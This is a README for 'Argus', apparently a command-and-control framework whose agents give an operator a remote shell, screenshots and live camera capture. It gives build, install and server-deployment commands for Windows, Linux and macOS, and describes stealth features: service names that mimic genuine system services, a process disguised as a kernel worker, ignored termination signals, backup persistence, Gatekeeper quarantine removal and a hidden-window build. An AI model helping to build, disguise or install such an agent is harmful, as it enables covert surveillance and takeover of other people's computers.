# Argus

C2 framework with WebSocket agent — shell, screenshot, and camera capture. Agents install as persistent system services and resist termination.

**Server:** Deploy on AWS EC2 using scripts in `deploy/`  
**Operator UI:** Access via HTTPS at your deployed domain (login with operator password)

---

## Agent Installation

### Prerequisites

- **Server URL:** `wss://your-domain.com` (set during deployment in `deploy/config`)
- **Agent token:** retrieve from the operator UI after server deployment
- The install command is the same on all platforms — replace the URL and token placeholders below

---

### Windows

**Requires:** Admin PowerShell

```powershell
# Clone the repo (use a GitHub personal access token as the password)
git clone https://github.com/andrewhannaford/argus.git
cd argus

# Install as a Windows service
.\dist\agent-windows-amd64.exe --install `
  --server wss://your-domain.com `
  --token <AGENT_TOKEN>
```

**What it installs:**
- Service name: `WdiSystemHost32` ("Diagnostic System Host")
- Runs as SYSTEM, starts automatically at boot
- Binary deployed to `%SystemRoot%\System32\wdisystemhost.exe`
- Registry Run key + scheduled task added as backup persistence

**Verify:**
```powershell
sc query WdiSystemHost32
```

**Uninstall:**
```powershell
.\dist\agent-windows-amd64.exe --uninstall
```

---

### Linux

**Requires:** root / sudo

```bash
git clone https://github.com/andrewhannaford/argus.git
cd argus

sudo ./dist/agent-linux-amd64 --install \
  --server wss://your-domain.com \
  --token <AGENT_TOKEN>
```

**What it installs:**
- systemd service: `systemd-hostnamed-ext`
- Runs as root, starts automatically at boot (`Restart=always`)
- Process renamed to `kworker/u4:2` (visible in top/ps)
- SIGTERM/SIGHUP ignored — requires SIGKILL to stop

**Verify:**
```bash
systemctl status systemd-hostnamed-ext
```

**Uninstall:**
```bash
sudo ./dist/agent-linux-amd64 --uninstall
```

---

### macOS

**Requires:** root / sudo  
**Apple Silicon (M1/M2/M3):** use `agent-darwin-arm64`  
**Intel:** use `agent-darwin-amd64`

```bash
git clone https://github.com/andrewhannaford/argus.git
cd argus

# Remove Gatekeeper quarantine (unsigned binary)
xattr -d com.apple.quarantine dist/agent-darwin-arm64 2>/dev/null || true

sudo ./dist/agent-darwin-arm64 --install \
  --server wss://your-domain.com \
  --token <AGENT_TOKEN>
```

**What it installs:**
- LaunchDaemon: `com.apple.security.diagnosticd`
- Runs as root, starts automatically at boot (`KeepAlive: true`)
- Logs to `/var/log/com.apple.security.diagnosticd.log`
- SIGTERM/SIGHUP ignored

**Verify:**
```bash
sudo launchctl list | grep diagnosticd
```

**Uninstall:**
```bash
sudo ./dist/agent-darwin-arm64 --uninstall
```

---

## Agent ID

By default the agent registers using the machine hostname. Override with `--id`:

```bash
--id "target-dc01"
```

---

## Operator UI

Open `https://your-domain.com` in a browser (the domain you set in `deploy/config`). Log in with the operator password you created during deployment.

Connected agents appear in the sidebar. Select one to open a shell, take a screenshot, or start the camera feed.

---

## Building from Source

Requires Go 1.21+.

```bash
# All platforms
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H windowsgui" -o dist/agent-windows-amd64.exe ./cmd/agent/
GOOS=linux   GOARCH=amd64 go build -ldflags "-s -w" -o dist/agent-linux-amd64  ./cmd/agent/
GOOS=darwin  GOARCH=amd64 go build -ldflags "-s -w" -o dist/agent-darwin-amd64 ./cmd/agent/
GOOS=darwin  GOARCH=arm64 go build -ldflags "-s -w" -o dist/agent-darwin-arm64 ./cmd/agent/

# Server (Linux deploy target)
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o deploy/server ./cmd/server/
```

---

## Server Deployment

See `deploy/` for AWS provisioning scripts:

1. Copy `deploy/config.example` to `deploy/config`
2. Edit `deploy/config` with your domain, email, and AWS region
3. Run deployment scripts in order:
   - `bash deploy/provision.sh` — creates EC2 instance and allocates Elastic IP
   - `bash deploy/setup-server.sh` — configures nginx, TLS, and systemd
   - `bash deploy/deploy-binary.sh` — builds and deploys the server binary

Keep `deploy/config` out of version control (it's in `.gitignore`). The deployment scripts will template your domain and email into the config files automatically.
